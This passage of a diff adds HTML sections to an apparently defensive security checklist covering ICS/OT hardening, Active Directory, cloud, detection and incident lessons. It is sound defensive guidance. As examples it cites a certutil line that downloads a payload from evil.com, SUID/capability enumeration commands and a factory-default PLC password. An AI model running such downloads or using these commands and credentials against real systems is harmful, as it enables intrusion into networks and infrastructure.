+          <span class="item-body">Attackers have repeatedly found Unitronics and Allen-Bradley/Rockwell PLCs exposed directly to the WAN and logged in with factory-default passwords. Route all remote access through a VPN or authenticated gateway — never expose the raw control port.</span>
+        <span class="item-extra"><b>Plain language</b>Industrial equipment should never be reachable directly from the open internet — full stop.</span><span class="item-extra"><b>Example</b>A water-treatment PLC should only be reachable by dialing into a VPN first, never by typing its IP address straight into a browser from home.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c4-2"><label for="c4-2">
+          <span class="item-title">Rotate every default and vendor-set credential on OT hardware</span>
+          <span class="item-body">Default passwords on PLCs and automatic tank gauges remain one of the single most common root causes of water-sector and energy-sector intrusions.</span>
+        <span class="item-extra"><b>Plain language</b>Change every 'admin/admin' and factory-default password on plant equipment the day it's installed.</span><span class="item-extra"><b>Example</b>The Unitronics PLC default password '1111' has been used in real attacks — change it before the device ever touches your network.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c4-3"><label for="c4-3">
+          <span class="item-title">Enforce Purdue Reference Architecture segmentation</span>
+          <span class="item-body">Unidirectional data flow and firewalling between Level 4/5 (enterprise IT) and Level 0–3 (industrial control/SCADA) stops an IT breach from ever reaching operational systems.</span>
+        <span class="item-extra"><b>Plain language</b>Keep the office network and the plant-floor network on separate, firewalled zones so an email phishing hit can't reach the machinery.</span><span class="item-extra"><b>Example</b>IT staff shouldn't be able to RDP straight from their laptop into a SCADA workstation — that link should require a jump host and approval.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c4-4"><label for="c4-4">
+          <span class="item-title">Harden cleartext industrial protocols with protocol-aware inspection</span>
+          <span class="item-body">Modbus TCP, DNP3, and EtherNet/IP were never designed with authentication in mind — deploy deep packet inspection and protocol-aware industrial firewalls rather than relying on network obscurity.</span>
+        <span class="item-extra"><b>Plain language</b>Old industrial communication protocols assume everyone on the network is trustworthy — add a firewall that actually understands and checks that traffic.</span><span class="item-extra"><b>Example</b>A Modbus-aware firewall that blocks an unauthorized device from sending a 'write coil' command to a pump controller it's never talked to before.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c4-5"><label for="c4-5">
+          <span class="item-title">Maintain known-clean offline backups of PLC/HMI images</span>
+          <span class="item-body">When (not if) a password gets tampered with, a verified clean image is the difference between a 20-minute restore and a multi-day boil-water notice.</span>
+        <span class="item-extra"><b>Plain language</b>Keep a known-good copy of every PLC/HMI configuration somewhere offline, so you can restore in minutes instead of days.</span><span class="item-extra"><b>Example</b>A USB drive in a locked safe with last month's verified-clean PLC backup, tested by actually restoring it once a quarter.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c4-6"><label for="c4-6">
+          <span class="item-title">Comply with AWIA Section 2013 risk &amp; resilience assessments</span>
+          <span class="item-body">Community water systems are required to maintain current Risk and Resilience Assessments and Emergency Response Plans under the EPA's America's Water Infrastructure Act.</span>
+        <span class="item-extra"><b>Plain language</b>If you run a public water system, you're legally required to have a written risk assessment and emergency plan — keep it current.</span><span class="item-extra"><b>Example</b>Update your AWIA risk and resilience assessment every 5 years and after any major network change, and keep a signed copy on file for EPA review.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c4-7"><label for="c4-7">
+          <span class="item-title">Run a CISA Tabletop Exercise Package (CTEP) for cyber-physical convergence</span>
+          <span class="item-body">CTEPs specifically map how a cyber intrusion cascades into a physical operational impact — invaluable for OT incident response planning. <span class="framework-tag">CISA</span></span>
+        <span class="item-extra"><b>Plain language</b>Practice what happens when a cyberattack turns into a physical safety problem, before it actually happens.</span><span class="item-extra"><b>Example</b>Run a tabletop exercise where 'ransomware locks the HMI mid-shift' — decide out loud who calls 911, who calls the state, and who can pull the manual override.</span></label>
+      </div>
+<div class="check-item">
+        <input type="checkbox" id="c4-8"><label for="c4-8">
+          <span class="item-title">Inventory every remote vendor connection into OT, each with its own unique credential</span>
+        <span class="item-extra"><b>Plain language</b>Don't let multiple vendors share one generic 'remote support' login — you won't know who did what, or be able to revoke just one vendor's access.</span><span class="item-extra"><b>Example</b>A HVAC vendor and a PLC vendor should each get a separate, named, time-limited VPN account — not a shared 'vendor' login that never expires.</span></label>
+      </div>
+    </section>
+
+    <!-- ============ SECTION 5 ============ -->
+    <section class="checklist-section" id="s5">
+      <div class="section-head">
+        <span class="section-num">05</span>
+        <h2>Identity &amp; Active Directory Defense</h2>
+      </div>
+      <p class="section-sub">Identity is the new perimeter. Attackers increasingly "log in" rather than "hack in" — MGM Resorts lost $100M to a single helpdesk phone call.</p>
+
+      <div class="check-item">
+        <input type="checkbox" id="c5-1"><label for="c5-1">
+          <span class="item-title">Eliminate accounts with Kerberos pre-authentication disabled</span>
+          <span class="item-body">Accounts with <code>Do not require Kerberos preauthentication</code> set are trivially targeted for AS-REP Roasting. Audit and remove the flag wherever it isn't explicitly required.</span>
+        <span class="item-extra"><b>Plain language</b>Turn off a Kerberos setting that lets attackers request and crack a password hash without even logging in first.</span><span class="item-extra"><b>Example</b>Run `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` in PowerShell and remove that flag from any account that doesn't specifically need it.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c5-2"><label for="c5-2">
+          <span class="item-title">Enforce AES over RC4 and move service accounts to gMSAs</span>
+          <span class="item-body">Group Managed Service Accounts with AES encryption dramatically raise the cost of Kerberoasting against SPN-registered service accounts. Monitor Windows Event ID 4769 for anomalous ticket requests.</span>
+        <span class="item-extra"><b>Plain language</b>Weak encryption on service account tickets lets an attacker crack the password offline at their leisure — turn it off.</span><span class="item-extra"><b>Example</b>A SQL service account with an SPN set and RC4 still enabled is an easy Kerberoasting target; switch it to AES and a managed account.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c5-3"><label for="c5-3">
+          <span class="item-title">Audit AD CS certificate templates for ESC1–ESC8 misconfigurations</span>
+          <span class="item-body">Overly permissive templates that allow client authentication and arbitrary SAN specification let a low-privilege user request a certificate that impersonates a domain administrator.</span>
+        <span class="item-extra"><b>Plain language</b>Some certificate templates accidentally let a regular employee request a certificate that logs them in as an admin — find and fix those.</span><span class="item-extra"><b>Example</b>Run Certipy or PSPKIAudit against your CA and look for any template flagged ESC1 that lets 'Domain Users' enroll and specify their own login name.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c5-4"><label for="c5-4">
+          <span class="item-title">Implement Tiered Administration (Tier 0/1/2) and PAWs</span>
+          <span class="item-body">Privileged Access Workstations and strict administrative tiering prevent a single compromised workstation from cascading into full domain compromise.</span>
+        <span class="item-extra"><b>Plain language</b>Don't let the same admin account that manages a helpdesk laptop also manage your domain controllers.</span><span class="item-extra"><b>Example</b>Domain Admins should only ever log in from a dedicated, locked-down admin laptop — never from the same machine used to read email.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c5-5"><label for="c5-5">
+          <span class="item-title">Mandate phishing-resistant MFA on every SSO, VPN, and helpdesk reset flow</span>
+          <span class="item-body">The MGM Resorts and Scattered Spider breach bypassed complex technical defenses with nothing more than a phone call to the helpdesk. Require out-of-band identity verification before any credential reset — MFA alone is not enough if the reset process itself isn't hardened.</span>
+        <span class="item-extra"><b>Plain language</b>A phone call to the helpdesk shouldn't be enough to reset someone's password — add a step that can't be faked over the phone.</span><span class="item-extra"><b>Example</b>Require a video callback to a manager on file, or an in-app approval, before any password reset for a privileged account — not just 'what's your employee ID.'</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c5-6"><label for="c5-6">
+          <span class="item-title">Audit and prune stale accounts in non-production/test tenants</span>
+          <span class="item-body">Midnight Blizzard's 2024 breach of Microsoft's corporate email began with a password-sprayed legacy test tenant account that lacked MFA. Zero-trust has to extend to non-production environments too.</span>
+        <span class="item-extra"><b>Plain language</b>Test and demo accounts get created, forgotten, and never cleaned up — and attackers love that.</span><span class="item-extra"><b>Example</b>A 'test-admin' account created for a 2022 pilot project, still active, still with Global Admin rights, and no MFA enabled.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c5-7"><label for="c5-7">
+          <span class="item-title">Graph domain trust paths and eliminate unconstrained delegation</span>
+          <span class="item-body">Use attack-path mapping defensively to find and close transitive access chains before an intruder maps them offensively.</span>
+        <span class="item-extra"><b>Plain language</b>Map out exactly which accounts can eventually reach 'Domain Admin' through indirect permissions — then close those paths.</span><span class="item-extra"><b>Example</b>Run BloodHound against your own domain and look for a low-privilege service account with an unnecessary 'GenericAll' right on a Domain Admin group.</span></label>
+      </div>
+<div class="check-item">
+        <input type="checkbox" id="c5-8"><label for="c5-8">
+          <span class="item-title">Enforce LAPS (randomized local admin passwords) on every workstation</span>
+        <span class="item-extra"><b>Plain language</b>If every computer shares the same local admin password, cracking one machine effectively cracks all of them — randomize it per device instead.</span><span class="item-extra"><b>Example</b>Deploy Microsoft LAPS so each workstation's local admin password is unique and automatically rotated, instead of the same password imaged onto 500 machines.</span></label>
+      </div>
+    </section>
+
+    <!-- ============ SECTION 6 ============ -->
+    <section class="checklist-section" id="s6">
+      <div class="section-head">
+        <span class="section-num">06</span>
+        <h2>Cloud, Container &amp; Edge Infrastructure</h2>
+      </div>
+      <p class="section-sub">Edge devices — VPNs, firewalls, routers — were the single most common initial access vector in 2025–2026 telemetry, and over 40% of exploited edge flaws hit end-of-life hardware.</p>
+
+      <div class="check-item">
+        <input type="checkbox" id="c6-1"><label for="c6-1">
+          <span class="item-title">Enforce IMDSv2 across every cloud instance</span>
+          <span class="item-body">Mandatory session tokens and hop-limit restrictions close the classic SSRF-to-credential-theft path against <code>169.254.169.254</code>.</span>
+        <span class="item-extra"><b>Plain language</b>Force cloud servers to prove who's asking before handing out temporary credentials — this closes a common web-app attack.</span><span class="item-extra"><b>Example</b>Require IMDSv2's session-token step on every EC2 instance so a vulnerable web app can't be tricked into fetching AWS credentials from 169.254.169.254.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c6-2"><label for="c6-2">
+          <span class="item-title">Run containers rootless and never mount the Docker socket</span>
+          <span class="item-body">Avoid <code>/var/run/docker.sock</code> mounts, <code>--privileged</code> flags, and unnecessary <code>CAP_SYS_ADMIN</code> grants. Enforce Pod Security Standards at the cluster level.</span>
+        <span class="item-extra"><b>Plain language</b>Don't give a container the keys to the entire host machine it's running on.</span><span class="item-extra"><b>Example</b>A compromised web-app container that has /var/run/docker.sock mounted can spin up a brand-new privileged container and escape entirely — don't mount it.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c6-3"><label for="c6-3">
+          <span class="item-title">Retire end-of-life edge hardware — routers, VPNs, firewalls</span>
+          <span class="item-body">More than 40% of actively exploited edge-device flaws in 2026 targeted hardware that had already reached end-of-life and stopped receiving patches. If a device can no longer be patched, it needs to be replaced, not perimeter-trusted.</span>
+        <span class="item-extra"><b>Plain language</b>If a router or firewall no longer gets security updates from the manufacturer, it needs to be replaced, not just 'watched.'</span><span class="item-extra"><b>Example</b>That 2016 office VPN appliance still in production, no longer receiving firmware updates, is a bigger risk than an unpatched laptop.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c6-4"><label for="c6-4">
+          <span class="item-title">Patch edge appliances immediately and forcibly kill active sessions after patching</span>
+          <span class="item-body">The Citrix Bleed vulnerability (CVE-2023-4966) leaked live session tokens from memory — patching alone doesn't invalidate a token stolen before the patch. Terminate all active sessions after every critical edge-device patch.</span>
+        <span class="item-extra"><b>Plain language</b>Patching isn't the finish line — if a bug could have leaked login sessions, kill those sessions too.</span><span class="item-extra"><b>Example</b>After patching Citrix NetScaler for Citrix Bleed, force-expire every active VPN session, not just apply the update and move on.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c6-5"><label for="c6-5">
+          <span class="item-title">Establish governance for "shadow AI" tools and unsanctioned LLM usage</span>
+          <span class="item-body">Employees adopting AI tools without IT oversight creates data-leakage and model-misuse gaps. Set explicit usage policy, access controls, and audit logging for approved AI tools.</span>
+        <span class="item-extra"><b>Plain language</b>Set actual rules for which AI tools employees are allowed to paste company data into.</span><span class="item-extra"><b>Example</b>A written policy saying 'no customer data in personal ChatGPT accounts, use only the company's approved enterprise AI tool' — plus a way to actually check.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c6-6"><label for="c6-6">
+          <span class="item-title">Continuously discover and baseline "shadow" APIs</span>
+          <span class="item-body">Unmanaged, undocumented API endpoints are a persistent blind spot for authentication-bypass and privilege-escalation bugs. Automated discovery should run continuously, not just at audit time.</span>
+        <span class="item-extra"><b>Plain language</b>APIs get built and forgotten just like servers do — keep an always-on inventory, not a yearly spreadsheet.</span><span class="item-extra"><b>Example</b>A mobile app's old v1 API endpoint, replaced by v2 two years ago, still live and still accepting requests with weaker auth checks.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c6-7"><label for="c6-7">
+          <span class="item-title">Validate origin checks on AI infrastructure endpoints</span>
+          <span class="item-body">CVE-2025-62593 (Ray) and CVE-2025-34291 (Langflow) both stemmed from insufficient origin validation on AI orchestration platforms — treat these the same as any other internet-facing service in your patch cadence. <span class="framework-tag">CISA KEV</span></span>
+        <span class="item-extra"><b>Plain language</b>Make sure your AI tools only accept requests from places they're supposed to — otherwise anyone on the internet can talk to them.</span><span class="item-extra"><b>Example</b>Confirm your internal Ray or Langflow cluster rejects requests with an unexpected `Origin` header instead of processing them by default.</span></label>
+      </div>
+<div class="check-item">
+        <input type="checkbox" id="c6-8"><label for="c6-8">
+          <span class="item-title">Require signed commits and build provenance checks in your CI/CD pipeline</span>
+        <span class="item-extra"><b>Plain language</b>Make sure code changes are cryptographically tied to a real, verified person before they can ship — this is what would have caught the XZ Utils backdoor earlier.</span><span class="item-extra"><b>Example</b>Require GPG-signed commits and enforce that unsigned commits can't be merged to your main branch or trigger a production build.</span></label>
+      </div>
+    </section>
+
+    <!-- ============ SECTION 7 ============ -->
+    <section class="checklist-section" id="s7">
+      <div class="section-head">
+        <span class="section-num">07</span>
+        <h2>Post-Exploitation Detection &amp; Lateral Movement</h2>
+      </div>
+      <p class="section-sub">Assume prevention will eventually fail somewhere. This section is about detecting movement after initial access — before it becomes a headline.</p>
+
+      <div class="check-item">
+        <input type="checkbox" id="c7-1"><label for="c7-1">
+          <span class="item-title">Enable process lineage auditing (Sysmon Event ID 1 / Windows 4688)</span>
+          <span class="item-body">Full command-line auditing is what turns "living off the land" binary abuse (LOLBAS/GTFOBins) from invisible into detectable.</span>
+        <span class="item-extra"><b>Plain language</b>Turn on detailed logging of exactly which programs run and with what commands, so you can reconstruct what an intruder did.</span><span class="item-extra"><b>Example</b>Enable Sysmon Event ID 1 so if `powershell.exe` spawns `certutil.exe -urlcache`, that exact command line is in your logs, not just 'PowerShell ran.'</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c7-2"><label for="c7-2">
+          <span class="item-title">Enable PowerShell Script Block Logging (Event ID 4104)</span>
+          <span class="item-body">Catches dynamic code execution and AMSI-bypass attempts that never touch disk as a file.</span>
+        <span class="item-extra"><b>Plain language</b>Log what PowerShell scripts actually did, not just that PowerShell ran — attackers hide inside scripts run entirely in memory.</span><span class="item-extra"><b>Example</b>Event ID 4104 logging catches an obfuscated in-memory script that never touches disk and would otherwise be invisible to antivirus.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c7-3"><label for="c7-3">
+          <span class="item-title">Baseline dual-use administrative binaries and alert on anomalous use</span>
+          <span class="item-body"><code>certutil</code>, <code>bitsadmin</code>, <code>wmic</code>, <code>awk</code>, <code>find</code>, and similar built-ins are frequently abused for lateral movement precisely because they're already trusted. Behavioral baselining catches what signature-based AV misses.</span>
+        <span class="item-extra"><b>Plain language</b>Notice when everyday admin tools get used in ways they normally wouldn't — that's often the first sign of trouble.</span><span class="item-extra"><b>Example</b>certutil.exe is a normal Windows tool, but certutil.exe -urlcache -f http://evil.com/payload.exe is not — alert on that pattern specifically.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c7-4"><label for="c7-4">
+          <span class="item-title">Configure append-only, immutable logging</span>
+          <span class="item-body">Ship logs off-host in real time so an attacker with local root can't erase their own execution trail.</span>
+        <span class="item-extra"><b>Plain language</b>Send your logs somewhere an attacker with admin rights on the compromised machine can't reach or delete them.</span><span class="item-extra"><b>Example</b>Ship logs to a separate SIEM server in near-real-time, so clearing the Windows Event Log locally doesn't erase the evidence.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c7-5"><label for="c7-5">
+          <span class="item-title">Detect BYOVD (Bring-Your-Own-Vulnerable-Driver) endpoint-protection kills</span>
+          <span class="item-body">The 2024 Halliburton/RansomHub intrusion disabled endpoint protection using signed-but-vulnerable drivers before wiping logs. Monitor for driver-load events from unexpected vendors, not just unsigned drivers.</span>
+        <span class="item-extra"><b>Plain language</b>Watch for legitimate-but-vulnerable drivers being loaded just to disable your antivirus — a real, growing ransomware trick.</span><span class="item-extra"><b>Example</b>Alert when a driver from an unusual vendor gets loaded right before your EDR agent silently stops reporting — that combination is a red flag.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c7-6"><label for="c7-6">
+          <span class="item-title">Alert on privilege-escalation misconfigurations before they're used</span>
+          <span class="item-body">Run scheduled audits for SUID/SGID binaries, writable service paths, unquoted service paths, <code>AlwaysInstallElevated</code>, and <code>SeImpersonatePrivilege</code> abuse conditions — fix them proactively rather than waiting to detect exploitation.
+          <pre><code>find / -type f -perm -4000 -ls 2>/dev/null
+getcap -r / 2>/dev/null</code></pre></span>
+        <span class="item-extra"><b>Plain language</b>Find and fix privilege-escalation weak spots on a schedule, instead of waiting to catch someone exploiting them.</span><span class="item-extra"><b>Example</b>Run a monthly script that lists every SUID binary and unquoted service path — fix what shouldn't be there rather than waiting for an alert.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c7-7"><label for="c7-7">
+          <span class="item-title">Maintain immutable, offline, tested backups</span>
+          <span class="item-body">Backups that are network-reachable from production are backups an attacker can encrypt too. Test restores on a schedule, not just after an incident.</span>
+        <span class="item-extra"><b>Plain language</b>A backup an attacker can also reach and encrypt isn't really a backup — keep at least one copy they can't touch.</span><span class="item-extra"><b>Example</b>A nightly backup written to immutable, offline cloud storage (or literally an air-gapped drive) that ransomware on the main network can't reach or modify.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c7-8"><label for="c7-8">
+          <span class="item-title">Run tabletop incident-response exercises against realistic scenarios</span>
+          <span class="item-body">Rehearse ransomware, third-party vendor compromise, and OT/IT pivot scenarios specifically — response speed is what separates a contained incident from a multi-week outage.</span>
+        <span class="item-extra"><b>Plain language</b>Practice a real incident on paper before you have a real one for real — it's cheaper to find gaps in a meeting room.</span><span class="item-extra"><b>Example</b>Run a 2-hour tabletop: 'ransomware note found at 8am Monday' — walk through who's notified, what gets shut down first, and who talks to customers.</span></label>
+      </div>
+<div class="check-item">
+        <input type="checkbox" id="c7-9"><label for="c7-9">
+          <span class="item-title">Deploy canary or honeytoken accounts to catch lateral movement early</span>
+        <span class="item-extra"><b>Plain language</b>Plant a fake, tempting-looking admin account that no legitimate process should ever touch — any activity on it is a near-certain intrusion signal.</span><span class="item-extra"><b>Example</b>Create a dummy 'svc-backup-admin' account with no real permissions; alert immediately on any login attempt or Kerberos ticket request against it.</span></label>
+      </div>
+    </section>
+
+    <!-- ============ SECTION 8 ============ -->
+    <section class="checklist-section" id="s8">
+      <div class="section-head">
+        <span class="section-num">08</span>
+        <h2>Defensive Tooling, Frameworks &amp; Advisories</h2>
+      </div>
+      <p class="section-sub">Static checklists go stale. These are the living, authoritative sources this checklist itself is built from — bookmark them, not just this page.</p>
+
+      <div class="check-item">
+        <input type="checkbox" id="c8-1"><label for="c8-1">
+          <span class="item-title">Subscribe to CISA Cybersecurity Advisories</span>
+          <span class="item-body">CISA's advisory feed is the fastest authoritative channel for newly disclosed and actively exploited vulnerabilities affecting U.S. infrastructure. <span class="src-link"><a href="https://www.cisa.gov/news-events/cybersecurity-advisories" target="_blank" rel="noopener">cisa.gov/news-events/cybersecurity-advisories ↗</a></span></span>
+        <span class="item-extra"><b>Plain language</b>Sign up for the government's free early-warning list for new, actively exploited vulnerabilities.</span><span class="item-extra"><b>Example</b>Add CISA's advisory RSS feed to your team's Slack channel so a new critical alert shows up automatically instead of being found a week later.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c8-2"><label for="c8-2">
+          <span class="item-title">Prioritize patching against the CISA KEV Catalog</span>
+          <span class="item-body">The Known Exploited Vulnerabilities Catalog is the single best source for "what's actually being used against real targets right now," as opposed to CVSS score alone.</span>
+        <span class="item-extra"><b>Plain language</b>When deciding what to patch first, check the government's list of vulnerabilities hackers are actually using right now.</span><span class="item-extra"><b>Example</b>If a CVE on your network is also on the CISA KEV list, it jumps to the top of this week's patch queue, ahead of a higher-CVSS bug that isn't.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c8-3"><label for="c8-3">
+          <span class="item-title">Map every control to MITRE D3FEND</span>
+          <span class="item-body">Where MITRE ATT&amp;CK catalogs offensive tactics, D3FEND (NSA-funded) maps precise, technical countermeasures against each one — use it to check for coverage gaps in your control set.</span>
+        <span class="item-extra"><b>Plain language</b>For every attack technique you're worried about, there's a specific, documented defense — look it up instead of guessing.</span><span class="item-extra"><b>Example</b>Search D3FEND for 'Kerberoasting' and get the exact named countermeasure (Credential Hardening) instead of inventing your own approach from scratch.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c8-4"><label for="c8-4">
+          <span class="item-title">Organize posture around NIST CSF 2.0</span>
+          <span class="item-body">Identify, Protect, Detect, Respond, Recover — plus the newer Govern function, which now explicitly covers AI and supply-chain risk oversight.</span>
+        <span class="item-extra"><b>Plain language</b>Use a common government-designed structure to organize your security program instead of a random list of tools.</span><span class="item-extra"><b>Example</b>Sort your security to-do list into Identify / Protect / Detect / Respond / Recover / Govern buckets — it makes gaps obvious at a glance.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c8-5"><label for="c8-5">
+          <span class="item-title">Reference the OWASP Top 10 (Web &amp; LLM editions)</span>
+          <span class="item-body">OWASP now maintains a dedicated Top 10 for Large Language Model applications alongside the classic web edition — essential as AI features get embedded into more products.</span>
+        <span class="item-extra"><b>Plain language</b>If you're building anything with AI features, there's now a specific checklist of AI-related risks separate from the normal web one.</span><span class="item-extra"><b>Example</b>Check your chatbot feature against OWASP's LLM Top 10 item 'Prompt Injection' specifically, not just the standard web app OWASP Top 10.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c8-6"><label for="c8-6">
+          <span class="item-title">Deploy open-source blue-team tooling where budget is constrained</span>
+          <span class="item-body">Wazuh (unified XDR), Suricata or Zeek (network detection), and OpenSCAP (automated compliance auditing) give under-resourced teams enterprise-grade visibility without an enterprise SIEM price tag.</span>
+        <span class="item-extra"><b>Plain language</b>You don't need a six-figure security budget to get real visibility — solid free tools exist.</span><span class="item-extra"><b>Example</b>Stand up Wazuh on a spare server for centralized log monitoring instead of paying for an enterprise SIEM you can't yet afford.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c8-7"><label for="c8-7">
+          <span class="item-title">Use BloodHound defensively to close hidden AD attack paths</span>
+          <span class="item-body">The same graph-based tooling attackers use to find a path to Domain Admin works just as well for a defender trying to eliminate that path first.</span>
+        <span class="item-extra"><b>Plain language</b>Use the same free tool attackers use to find a path to 'Domain Admin' — but use it to close that path first.</span><span class="item-extra"><b>Example</b>Run BloodHound against your own AD, find the shortest path from a help-desk account to Domain Admin, and remove the permission that makes it possible.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c8-8"><label for="c8-8">
+          <span class="item-title">Run a baseline package-integrity check on Linux hosts</span>
+          <span class="item-body">A simple scheduled integrity check can surface unauthorized binary modification consistent with rootkit activity.
+          <pre><code>apt-get update && apt-get install -y debsums && debsums -c -s 2>&1</code></pre></span>
+        <span class="item-extra"><b>Plain language</b>Periodically verify that your installed software hasn't been secretly modified by malware.</span><span class="item-extra"><b>Example</b>A weekly `debsums -c` cron job that emails you if any installed package's files don't match their original checksums.</span></label>
+      </div>
+<div class="check-item">
+        <input type="checkbox" id="c8-9"><label for="c8-9">
+          <span class="item-title">Join an ISAC/ISAO relevant to your sector for peer threat intelligence</span>
+        <span class="item-extra"><b>Plain language</b>Other organizations in your industry are seeing the same attackers — sharing information gets everyone advance warning.</span><span class="item-extra"><b>Example</b>Water utilities can join WaterISAC, healthcare orgs can join H-ISAC — both share real-time indicators of compromise seen against sector peers before they hit you.</span></label>
+      </div>
+    </section>
+
+    <!-- ============ SECTION 9 ============ -->
+    <section class="checklist-section" id="s9">
+      <div class="section-head">
+        <span class="section-num">09</span>
+        <h2>Defending U.S. Infrastructure &amp; Companies From Foreign Hacking</h2>
+      </div>
+      <p class="section-sub">State-linked hacking groups out of China, Russia, Iran, and North Korea, along with the ransomware crews operating with their tolerance, have moved from opportunistic crime to sustained campaigns against American water utilities, energy grids, telecoms, hospitals, and companies of every size. None of these intrusions started with something exotic — they started with an exposed PLC, an unpatched edge device, a phished credential, or a trusted vendor with weak controls. Every checkbox below is a documented pattern from CSIS's <a href="https://www.csis.org/programs/strategic-technologies-program/significant-cyber-incidents" target="_blank" rel="noopener">Significant Cyber Incidents</a> timeline, paraphrased into the specific control that would have closed the door. Work through it as a standing defense posture, not a one-time read — foreign intrusion campaigns are ongoing, and the checklist should be too.</p>
+
+      <h3 style="color:var(--green-dim); font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; margin:26px 0 4px;">Ransomware &amp; Extortion</h3>
+      <div class="check-item">
+        <input type="checkbox" id="c9-1"><label for="c9-1">
+          <span class="item-title">Third-party vendor ransomware taking down 35 statewide clinics</span>
+          <span class="item-body">A ransomware attack on the University of Mississippi Medical Center (Feb. 2026) forced every clinic offline and reverted the EPIC records system to pen-and-paper — confirm your downstream vendors have tested EHR/critical-app failover plans, not just backups.</span>
+        <span class="item-extra"><b>Plain language</b>If your hospital or clinic depends on an outside records vendor, make sure there's a paper-and-clipboard backup plan that's actually been practiced.</span><span class="item-extra"><b>Example</b>Print a current patient schedule every morning so, if the EHR goes down at 9am, the front desk isn't starting from zero.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-2"><label for="c9-2">
+          <span class="item-title">National data center ransomware halting government services</span>
+          <span class="item-body">Indonesia's national data center (June 2024) lost unbacked-up immigration records to ransomware — confirm every critical dataset has a tested, offline backup, not just a "backed up" checkbox.</span>
+        <span class="item-extra"><b>Plain language</b>A backup that's never been tested might as well not exist — actually try restoring from it.</span><span class="item-extra"><b>Example</b>Once a quarter, restore a real backup to a spare server and confirm the data comes back intact, not just that the backup job 'completed successfully.'</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-3"><label for="c9-3">
+          <span class="item-title">Postal/logistics ransomware disrupting deliveries at scale</span>
+          <span class="item-body">The UK's Royal Mail (Jan. 2023) had international mail-tracking systems knocked out by ransomware — confirm logistics and tracking systems are segmented from the general corporate network.</span>
+        <span class="item-extra"><b>Plain language</b>If a core operational system fails, know exactly how work continues without it, at least for a day.</span><span class="item-extra"><b>Example</b>A tracking/logistics vendor outage shouldn't stop physical deliveries — have a manual dispatch and tracking sheet ready to hand out same-day.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-4"><label for="c9-4">
+          <span class="item-title">State/local government paralysis after ransomware</span>
+          <span class="item-body">Costa Rica's Ministry of Finance (Apr. 2022) and Ministry of Public Works (Jan. 2023) both lost core operations to ransomware with multimillion-dollar ransom demands — confirm your incident response plan defines a no-negotiation default and a legal/comms chain of command in advance.</span>
+        <span class="item-extra"><b>Plain language</b>Decide your organization's ransom stance before an attack, not during one, while everyone is panicking.</span><span class="item-extra"><b>Example</b>A written policy: 'we do not pay ransoms; legal and the CEO are notified within 1 hour of any encryption event' — agreed on in advance, not improvised.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-5"><label for="c9-5">
+          <span class="item-title">Ransomware against an oil/energy company blamed on geopolitical rivals</span>
+          <span class="item-body">Venezuela's state oil company PDVSA (Dec. 2025) had administrative systems and cargo logistics disrupted by ransomware — confirm OT-adjacent logistics scheduling systems are isolated from internet-facing administrative IT.</span>
+        <span class="item-extra"><b>Plain language</b>Separate the systems that schedule and track physical operations from the general office network.</span><span class="item-extra"><b>Example</b>Keep the shipping and cargo-scheduling system on its own network segment so a phishing email in accounting can't reach it.</span></label>
+      </div>
+
+      <h3 style="color:var(--green-dim); font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; margin:26px 0 4px;">Critical Infrastructure &amp; OT</h3>
+      <div class="check-item">
+        <input type="checkbox" id="c9-6"><label for="c9-6">
+          <span class="item-title">Multi-site energy-grid OT sabotage with no wide outage — but real equipment damage</span>
+          <span class="item-body">A coordinated attack on ~30 sites tied to Poland's energy grid (Jan. 2026) damaged OT equipment without triggering a blackout — confirm OT equipment has independent physical safety interlocks that don't rely on the network layer.</span>
+        <span class="item-extra"><b>Plain language</b>Even if the network gets compromised, physical equipment shouldn't be able to change state without a human confirming it locally.</span><span class="item-extra"><b>Example</b>A valve that requires a physical key-turn or a second local confirmation before opening — not one that opens the instant it gets the right network command.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-7"><label for="c9-7">
+          <span class="item-title">Hacktivists exploiting default credentials on internet-facing ICS</span>
